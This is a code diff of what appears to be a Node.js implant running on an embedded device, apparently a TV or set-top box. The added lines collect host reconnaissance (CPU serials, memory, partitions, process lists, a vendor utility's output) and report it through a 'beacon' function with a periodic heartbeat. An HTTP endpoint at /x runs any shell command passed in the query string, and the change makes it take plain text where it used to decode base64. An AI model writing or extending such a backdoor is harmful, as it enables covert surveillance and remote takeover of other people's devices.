@@ -23,12 +23,17 @@
   beacon('mounts', sync('cat /proc/mounts | grep -vE "cgroup|sysfs|proc |devpts|securityfs" | head -35'));
   beacon('dev', sync('ls -la /dev | grep -E "mem|video|fb|sg |ttyS|i2c" | head -20'));
   beacon('psx', sync('ls /proc | grep -E "^[0-9]+$" | while read p; do echo "$p $(cat /proc/$p/comm 2>/dev/null) $(grep ^Uid /proc/$p/status 2>/dev/null | cut -f2)"; done | head -80'));
+  beacon('cpu', sync('grep -E "processor|model|Implementer|part|Hardware|Serial|Revision" /proc/cpuinfo | head -30; cat /proc/device-tree/model 2>/dev/null; echo; cat /proc/cpuinfo | grep -c processor'));
+  beacon('mem', sync('head -6 /proc/meminfo'));
+  beacon('stor', sync('cat /proc/partitions; cat /sys/block/mmcblk0/size 2>/dev/null; df -h 2>/dev/null | head -22'));
+  beacon('wasu', sync('ls -la /usr/bin/wasutility; wasutility 2>&1 | head -30'));
+  beacon('psu', sync('ps -ef 2>/dev/null | tail -60'));
   setInterval(function () { beacon('hb', String(Date.now())); }, 10000);
   var srv = http.createServer(function (req, res) {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
     var url = require('url').parse(req.url, true);
     if (url.pathname === '/x' && url.query.c) {
-      try { res.end(sync((typeof Buffer.from === 'function' ? Buffer.from(url.query.c, 'base64') : new Buffer(url.query.c, 'base64')).toString('utf8'))); }
+      try { res.end(sync(url.query.c)); }
       catch (e) { res.end('[EXC] ' + e); }
     } else { res.end('v2 alive\n'); }
   });
